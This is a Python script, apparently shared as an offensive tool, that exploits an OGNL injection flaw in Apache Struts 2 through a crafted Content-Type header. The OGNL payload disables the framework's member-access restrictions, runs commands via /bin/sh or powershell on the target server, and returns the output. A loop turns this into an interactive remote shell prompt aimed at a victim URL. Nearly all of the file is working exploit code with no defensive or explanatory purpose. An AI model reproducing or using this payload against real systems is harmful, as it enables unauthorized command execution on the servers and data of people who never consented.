#!/usr/bin/python
#Code By @s1kr10s

import requests
import os

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])
cls()

logo = BLUE+'''                                                             
        `.``                                                              
     `+++++++:`                                                           
    `+++++++++,`  :++'`                             .'++`                 
    ++++,..'++,.  +++'.                             ,+++,`                
   `+++.:,.,,::`  +++',                             ,+++:`                
   .+++:.`  `..   ++++,                             ,+++:`                
   .+++:`       ''+++++++  `'+``+++.`:'+'`  `'++` +'+++++++.   ;+++++,    
   `++++.       +++++++++,`'++,++++..+++'.  ,+++,`+++++++++`` ++++++++.`  
    +++++'.     ::++++';::`:++++++':.+++'.  ,+++:`:::+++';;,.,+++:::+;:`  
    .++++++'`   `,++++:,,. .+++',:,,`+++',  ,+++:``.:+++::,.`+++.:,,,,.   
     .;++++++.   `++++,``  `+++:,``` +++'.  ,+++:`  ,+++,.`  +++:.` ```   
      .,;+++++.   ++++,    `+++:.    +++',  ,+++:`  ,+++,`   ;++++:       
       `.,;+++:`  ++++,    `+++:`    +++'.  ,+++:`  ,+++,`   `++++++;`    
         `.++++,  ++++,    `+++:`    +++'.  ,+++:`  ,+++:`    .++++++'`   
           :+++,` ++++,    `+++:`    +++'.  ,+++:`  ,+++,`     ..:++++,`  
           ;+++,` ++++,`   `+++:`    +++'.  ,+++:`  .+++:`      `.,'++..  
    +,`    +++;,  ++++, .  `+++:`    +++',  :+++:`  .+++:``  :`   `;++`.  
   `++++++++++..  ;++++++.``+++:`    +++++++++++:`  `++++++``+++;,;+++,.  
   ,+++++++++,:`  `++++++..`+++:`    .++++++'+++,`   ++++++:.++++++++::`  
    .;++++++`:.    ,+++++`.`'';:`     ,++++`:++,,`   .+++++.,.:+++++;:.   
    `.,.`.,:,`     `,,,::,` `,,.`     `.:::,..,,.`    .,,,:,.`.,,.`,,.`   
       `````         ``.``              ````  ``       `..``    ``.``  By Miguel Mendez Z.
                        -=[Execute command Tools]=-                                                      
'''+ENDC
print logo

print " * Usage: www.victima.com/files.login\n\n"
host = raw_input(BOLD+" [+] HOST con http(s): "+ENDC)
print "\n"

def exploit(comando):
  exploit = "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(comando)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'powershell.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"
  return exploit

while 1:
	separador = raw_input(GREEN+"Struts@Shell:$ "+ENDC)
	headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit(str(separador))}
	request = requests.get(host, headers=headers,verify=False)
	print(request.text)
